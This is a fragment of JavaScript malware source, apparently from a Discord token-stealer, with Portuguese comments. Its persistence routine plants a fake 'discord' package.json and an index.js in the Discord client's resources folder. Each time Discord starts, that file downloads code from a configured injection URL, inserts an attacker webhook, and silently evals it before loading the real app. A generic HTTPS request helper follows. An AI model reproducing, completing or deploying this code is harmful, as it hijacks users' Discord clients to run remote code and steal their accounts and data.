// --- PERSISTÊNCIA (RE-INJECTION) ---
const p3rsist = () => {
    try {
        const resourcePath = process.mainModule.path;
        const appPath = path.join(resourcePath, 'app');
        const indexFile = path.join(appPath, 'index.js');
        const packageFile = path.join(appPath, 'package.json');

        // Correção do 'chunk' e escape de barras para Windows
        const bootstrapCode = `const https=require('https'),fs=require('fs'),path=require('path');https.get('${CONFIG.injection_url}',(res)=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{eval(d.replace('%WEBHOOK%','${CONFIG.webhook}'))}catch(e){}})}).on('error',()=>{});require('${path.join(resourcePath, 'app.asar').replace(/\\/g, '\\\\')}');`;

        if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
        fs.writeFileSync(packageFile, JSON.stringify({ name: "discord", main: "index.js" }, null, 4));
        if (!fs.existsSync(indexFile) || fs.readFileSync(indexFile, 'utf8') !== bootstrapCode) {
            fs.writeFileSync(indexFile, bootstrapCode);
        }
    } catch (e) {}
};

// --- CORE UTILS ---
const request = async (method, url, headers, data) => {
    const p = new URL(url);
    const options = { 
        protocol: p.protocol, 
        hostname: p.host, 
        path: p.pathname + (p.search || ""), 
        method: method, 
        headers: { "Access-Control-Allow-Origin": "*", ...headers } 
    };
    return new Promise((resolve) => {
        const req = https.request(options, (res) => { 
            let resD = ""; 
            res.on("data", c => resD += c); 
            res.on("end", () => resolve(resD)); 
        });
        if (data) req.write(data); req.end();
    });
};

